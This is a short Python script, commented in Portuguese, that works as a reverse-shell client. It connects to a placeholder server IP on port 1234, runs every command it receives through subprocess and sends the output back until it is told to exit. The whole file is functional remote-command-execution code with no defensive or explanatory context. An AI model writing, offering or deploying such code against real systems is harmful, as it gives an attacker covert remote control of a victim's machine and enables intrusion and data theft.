import socket
import subprocess

HOST = 'seu_ip_local'  # Colocar o IP local do seu servidor aqui
PORT = 1234  # Usar a mesma porta definida no script do servidor

with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
    s.connect((HOST, PORT))
    while True:
        command = s.recv(1024).decode()
        if command.lower() == "exit":
            break
        output = subprocess.getoutput(command)
        s.sendall(output.encode())
